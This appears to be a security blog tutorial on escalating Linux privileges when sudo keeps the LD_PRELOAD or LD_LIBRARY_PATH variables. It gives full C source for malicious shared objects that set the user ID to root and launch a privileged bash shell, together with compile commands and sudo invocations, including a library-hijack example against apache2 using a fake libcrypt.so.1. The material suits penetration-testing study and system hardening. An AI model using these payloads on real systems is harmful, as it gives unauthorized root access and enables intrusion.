---
layout: single
title: Linux LD_PRELOAD PrivEsc
excerpt: How to escalate privileges using LD_Preload.
date: 2021-09-27
classes: wide
header:
  teaser: #/assets/images/htb-writeup-giddy/giddy_logo.png
categories:
  - privesc
tags:
  - ld_preload
---

Execute `sudo -l` and verify if the following variables are inherited:

```sql
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH 
```

    
`LD_PRELOAD` and `LD_LIBRARY_PATH` are both inherited from the user's environment. `LD_PRELOAD` loads a shared object before any others when a program is run. `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.
    

Create a shared object using the code below:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

    
Compile it

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```


Run one of the programs you are allowed to run via `sudo` ( listed when running `sudo -l` ), while setting the `LD_PRELOAD` environment variable to the full path of the new shared object:

```bash
sudo LD_PRELOAD=/tmp/preload.so <program-name-here>
```

    

A root shell should spawn. 

---

In our example, we are going to use the following scenario:

```bash
# sudo -l                                                                                                                                                             
Matching Defaults entries for user on this host:                                                                                                                                              
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH                                                                                                                                
                                                                                                                                                                                              
User user may run the following commands on this host:                                                                                                                                        
    (root) NOPASSWD: /usr/sbin/iftop                                                                                                                                                          
    (root) NOPASSWD: /usr/bin/find                                                                                                                                                            
    (root) NOPASSWD: /usr/bin/nano                                                                                                                                                            
    (root) NOPASSWD: /usr/bin/vim                                                                                                                                                             
    (root) NOPASSWD: /usr/bin/man                                                                                                                                                             
    (root) NOPASSWD: /usr/bin/awk                                                                                                                                                             
    (root) NOPASSWD: /usr/bin/less                                                                                                                                                            
    (root) NOPASSWD: /usr/bin/ftp                                                                                                                                                             
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

    
Run `ldd` against the `apache2` program file to see which shared libraries are used by the program:

```bash
ldd /usr/sbin/apache2
```

```bash
linux-vdso.so.1 =>  (0x00007fffb9bff000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fdd290d7000)
libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fdd28eb3000)
libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fdd28c79000)
libpthread.so.0 => /lib/libpthread.so.0 (0x00007fdd28a5d000)
libc.so.6 => /lib/libc.so.6 (0x00007fdd286f1000)
libuuid.so.1 => /lib/libuuid.so.1 (0x00007fdd284ec000)
librt.so.1 => /lib/librt.so.1 (0x00007fdd282e4000)
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fdd280ad000)
libdl.so.2 => /lib/libdl.so.2 (0x00007fdd27ea8000)
libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fdd27c80000)
/lib64/ld-linux-x86-64.so.2 (0x00007fdd29594000)
```

Create a shared object with the same name as one of the listed libraries (`libcrypt.so.1`) using the code below:

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Compile it:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
```

Run `apache2` using `sudo`, while settings the `LD_LIBRARY_PATH` environment variable to `/tmp`

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

A root shell should spawn